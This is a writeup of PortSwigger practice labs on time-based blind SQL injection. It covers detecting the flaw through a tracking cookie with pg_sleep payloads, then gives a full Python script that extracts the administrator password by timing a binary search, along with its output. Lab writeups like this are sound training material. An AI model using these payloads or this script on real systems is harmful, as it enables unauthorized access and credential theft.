---
title: Blind SQL injection with time delays and Information retrieval
description: A writeup of PortSwigger's SQL injection lab for blind sqli based on time delays.
author: Koussay Dhifi
categories: [Writeups, WebExploitation]
tags: [WebExploitation, SQLInjection, PortSwigger, Labs, UNION]
mermaid: true
---

## Introduction

This is another SQLi lab titled [Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays) And also this is a writeup for [ Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval). This time, we are dealing with time-based SQLi. From what I've read and understood, time-based SQLi relies on your ability in recon, so you know how much time a DBMS would take if a condition is correct, and how much time it would take if it is false.

## Recon

We see the usual e-commerce-like website provided by PortSwigger, shown in the following image.

![Lab Overview](../assets/sqli/lab14/image.png)

When we send any type of request and intercept the traffic using Burp Suite, we realize there's a field within the cookie field named TrackingId.

```sh
Cookie: TrackingId=x4W5yFPefX1xumuj; session=Uujnc9Vm1QIT0kEkA1senoZ9UnVvC2vd
```

## Vuln Detection and Analysis

If we inject anything to try to cause an error, like `'` or other invalid SQL syntax, nothing happens. At first, it appears that there is no SQLi vulnerability here, but when we inject something with time delays, like `' AND EXISTS(SELECT 1 FROM pg_sleep(10)) -- `, we wait 10 seconds until the server returns a response for us... Guess what that means? Right, it's SQLi with time delays, and we can exploit this to extract sensitive data like the admin's password. If we inject just that sleep payload, the lab [Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays) is solved, and we move on to the next lab which is something more entertaining — We will be extracting the password by exploiting this time delay vulnerability.

## Exploitation and Payload

So what we will be doing is the usual `Short-Circuit Evaluation`. If we have a logical OR with the first element being True, then there's no need to move to the second one.

```
A OR B
```

If A = True, most programming languages and the DBMS here don't even bother checking whether B is True or not. So what we will do is select the password using the usual binary search, with the second condition this time being the time delay: if there is a time delay, then the password isn't what we proposed, and we move to the next character.

The payloads we are going to use are one for determining the length of the password for admin, and one for determining the character at a specific index.

```sql
' OR EXISTS(SELECT password FROM users WHERE username='administrator' AND LENGTH(password)=X) OR EXISTS(SELECT 1 FROM pg_sleep(10)) --
' OR EXISTS(SELECT password FROM users WHERE username='administrator' AND ASCII(SUBSTR(password,1,1))>=X) OR EXISTS(SELECT 1 FROM pg_sleep(10)) --
```

If there is a 10-second delay, then this isn't the result we're looking for, so we move to the next one.

The exploit is as follows.

```py

import requests

URL = "https://0a8f00ce04b8bb6481ee256c00ef0064.web-security-academy.net/"
minn = 32
maxx = 126

## Cookies placeholder 
cookies = lambda injection:{"TrackingId":f"{injection.strip()} ", "session":"ZbemPa57NXOP8kt77MLbirI82qzKIuS1"}

## Queries to extract password
queryEquals = lambda i, x: f"""
' OR EXISTS(SELECT password FROM users WHERE username='administrator' AND ASCII(SUBSTR(password,{i},1))={x}) OR EXISTS(SELECT 1 FROM pg_sleep(10)) --
"""

queryInf = lambda i, x: f"""
' OR EXISTS(SELECT password FROM users WHERE username='administrator' AND ASCII(SUBSTR(password,{i},1))<{x}) OR EXISTS(SELECT 1 FROM pg_sleep(10)) --
"""

querySup = lambda i, x: f"""
' OR EXISTS(SELECT password FROM users WHERE username='administrator' AND ASCII(SUBSTR(password,{i},1))>{x}) OR EXISTS(SELECT 1 FROM pg_sleep(10)) --
"""

queryLength = lambda l: f"""
' OR EXISTS(SELECT password FROM users WHERE username='administrator' AND LENGTH(password)={l}) OR EXISTS(SELECT 1 FROM pg_sleep(10)) --"""

## Algorithm to brute force password length

passLength = 1

while True:
	print(f"Trying length {passLength}")
	r = requests.get(URL, cookies = cookies(queryLength(passLength)))
		
	if r.elapsed.total_seconds() < 10:
		break
	else:
		passLength += 1


print(f"Found password LENGTH {passLength}")


## Binary Search algorithm to extract the password

counter = 1
password = ""

while counter <= passLength:

	mid = (minn+maxx)//2
	
	if requests.get(URL, cookies=cookies(queryEquals(counter,mid))).elapsed.total_seconds() < 10:
		password += chr(mid)
		print(f"[*] Finding password letter number {counter} : {password}")
		counter += 1
		minn = 32
		maxx = 126

	elif requests.get(URL, cookies=cookies(queryInf(counter,mid))).elapsed.total_seconds() < 10:
		maxx = mid - 1
		
	elif requests.get(URL, cookies=cookies(querySup(counter,mid))).elapsed.total_seconds() < 10:
		minn = mid + 1
		


print(f"[+] Final password is {password}")
```

After I run the exploit, it takes some time to finish — maybe 30 minutes — since we rely on a sleep of 10 seconds for each failed attempt. You can reduce the time window to 5 seconds, but I just wanted to make sure.

The payload execution result is as follows.

```sh
$ python3 exploit.py 
Trying length 1
Trying length 2
Trying length 3
Trying length 4
Trying length 5
Trying length 6
Trying length 7
Trying length 8
Trying length 9
Trying length 10
Trying length 11
Trying length 12
Trying length 13
Trying length 14
Trying length 15
Trying length 16
Trying length 17
Trying length 18
Trying length 19
Trying length 20
Found password LENGTH 20
[*] Finding password letter number 1 : 2
[*] Finding password letter number 2 : 2m
[*] Finding password letter number 3 : 2mc
[*] Finding password letter number 4 : 2mc5
[*] Finding password letter number 5 : 2mc5w
[*] Finding password letter number 6 : 2mc5wc
[*] Finding password letter number 7 : 2mc5wcc
[*] Finding password letter number 8 : 2mc5wccp
[*] Finding password letter number 9 : 2mc5wccpz
[*] Finding password letter number 10 : 2mc5wccpzn
[*] Finding password letter number 11 : 2mc5wccpzns
[*] Finding password letter number 12 : 2mc5wccpznsh
[*] Finding password letter number 13 : 2mc5wccpznshe
[*] Finding password letter number 14 : 2mc5wccpznshek
[*] Finding password letter number 15 : 2mc5wccpznshekf
[*] Finding password letter number 16 : 2mc5wccpznshekfc
[*] Finding password letter number 17 : 2mc5wccpznshekfcv
[*] Finding password letter number 18 : 2mc5wccpznshekfcvm
[*] Finding password letter number 19 : 2mc5wccpznshekfcvmz
[*] Finding password letter number 20 : 2mc5wccpznshekfcvmzn
[+] Final password is 2mc5wccpznshekfcvmzn
```

We got the credentials, which are `administrator:2mc5wccpznshekfcvmzn`, and we can now log in to the administrator account. The lab is already solved, but I just wanted to test how this would work if I wanted to extract the admin's password.

## Conclusion

That was a nice lab — a new concept we learned — and we need to keep in mind that sometimes an input field won't show us anything if we inject SQL code there, so we always need to make sure by using the sleep functionality.